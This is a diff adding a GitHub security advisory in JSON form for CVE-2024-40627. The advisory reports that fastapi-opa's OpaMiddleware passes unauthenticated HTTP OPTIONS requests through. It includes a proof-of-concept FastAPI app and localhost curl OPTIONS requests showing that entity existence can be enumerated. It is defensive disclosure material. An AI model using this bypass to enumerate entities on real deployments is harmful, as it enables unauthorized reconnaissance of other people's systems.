@@ -1,0 +1,77 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-5f5c-8rvc-j8wf",
+  "modified": "2024-07-15T21:39:12Z",
+  "published": "2024-07-15T17:49:25Z",
+  "aliases": [
+    "CVE-2024-40627"
+  ],
+  "summary": "OpaMiddleware does not filter HTTP OPTIONS requests",
+  "details": "### Summary\n\nHTTP `OPTIONS` requests are always allowed by `OpaMiddleware`, even when they lack authentication, and are passed through directly to the application.\n\nThe maintainer uncertain whether this should be classed as a \"bug\" or \"security issue\" – but is erring on the side of \"security issue\" as an application could reasonably assume OPA controls apply to *all* HTTP methods, and it bypasses more sophisticated policies.\n\n### Details\n\n`OpaMiddleware` allows all HTTP `OPTIONS` requests without evaluating it against any policy:\n\nhttps://github.com/busykoala/fastapi-opa/blob/6dd6f8c87e908fe080784a74707f016f1422b58a/fastapi_opa/opa/opa_middleware.py#L79-L80\n\nIf an application provides different responses to HTTP `OPTIONS` requests based on an entity existing (such as to indicate whether an entity is writable on a system level), an unauthenticated attacker could discover which entities exist within an application (CWE-204).\n\n### PoC\n\nThis toy application is based on the behaviour of an app[^1] which can use `fastapi-opa`. The app uses the `Allow` header of a HTTP `OPTIONS` to indicate whether an entity is writable on a \"system\" level, and returns HTTP 404 for unknown entities:\n\n[^1]: an open source app, not written by me\n\n```python\n# Run with: fastapi dev opa-poc.py --port 9999\nfrom fastapi import FastAPI, Response, HTTPException\nfrom fastapi_opa import OPAConfig, OPAMiddleware\nfrom fastapi_opa.auth.auth_api_key import APIKeyAuthentication, APIKeyConfig\n\n# OPA doesn't actually need to be running for this example\nopa_host = \"http://localhost:8181\"\napi_key_config = APIKeyConfig(\n    header_key = 'ApiKey',\n    api_key = 'secret-key',\n)\napi_key_auth = APIKeyAuthentication(api_key_config)\nopa_config = OPAConfig(authentication=api_key_auth, opa_host=opa_host)\n\napp = FastAPI()\napp.add_middleware(OPAMiddleware, config=opa_config)\n\nWRITABLE_ITEMS = {\n    1: True,\n    2: False,\n}\n\n\n@app.get(\"/\")\nasync def root() -> dict:\n    return {\"msg\": \"success\"}\n\n@app.get(\"/items/{item_id}\")\nasync def read_item(item_id: int):\n    if item_id not in WRITABLE_ITEMS:\n        raise HTTPException(status_code=404)\n    return {\"item_id\": item_id}\n\n@app.options(\"/items/{item_id}\")\nasync def read_item_options(response: Response, item_id: int) -> dict:\n    if item_id not in WRITABLE_ITEMS:\n        raise HTTPException(status_code=404)\n\n    response.headers[\"Allow\"] = \"OPTIONS, GET\" + (\", POST\" if WRITABLE_ITEMS[item_id] else \"\")\n    return {}\n```\n\nAs expected, HTTP `GET` requests fail consistently when unauthenticated, regardless of whether the entity exists, because `read_item()` is never executed:\n\n```\n$ curl -i 'http://localhost:9999/items/1'\nHTTP/1.1 401 Unauthorized\nserver: uvicorn\ncontent-length: 26\ncontent-type: application/json\n\n{\"message\":\"Unauthorized\"}\n\n$ curl -i 'http://localhost:9999/items/3'\nHTTP/1.1 401 Unauthorized\nserver: uvicorn\ncontent-length: 26\ncontent-type: application/json\n\n{\"message\":\"Unauthorized\"}\n```\n\nHowever, HTTP `OPTIONS` requests are never authenticated by `OpaMiddleware`, so are passed straight through to `read_item_options()` and returned to unauthenticated users:\n\n```\n$ curl -i -X OPTIONS 'http://localhost:9999/items/1'\nHTTP/1.1 200 OK\nserver: uvicorn\ncontent-length: 2\ncontent-type: application/json\nallow: OPTIONS, GET, POST\n\n{}\n\n$ curl -i -X OPTIONS 'http://localhost:9999/items/2'\nHTTP/1.1 200 OK\nserver: uvicorn\ncontent-length: 2\ncontent-type: application/json\nallow: OPTIONS, GET\n\n{}\n\n$ curl -i -X OPTIONS 'http://localhost:9999/items/3'\nHTTP/1.1 404 Not Found\nserver: uvicorn\ncontent-length: 22\ncontent-type: application/json\n\n{\"detail\":\"Not Found\"}\n```\n\n### Versions\n\n```\nfastapi-opa==2.0.0\nfastapi==0.111.0\n```",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "fastapi-opa"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.0.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/busykoala/fastapi-opa/security/advisories/GHSA-5f5c-8rvc-j8wf"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-40627"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/busykoala/fastapi-opa/commit/9458845a6f6f414c0b79587fae83d7f14d74dfb4"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/busykoala/fastapi-opa/commit/9588109ff651f7ffc92687129c4956126443fb8c"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/busykoala/fastapi-opa"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/busykoala/fastapi-opa/blob/6dd6f8c87e908fe080784a74707f016f1422b58a/fastapi_opa/opa/opa_middleware.py#L79-L80"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-204"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-07-15T17:49:25Z",
+    "nvd_published_at": "2024-07-15T20:15:05Z"
+  }
+}
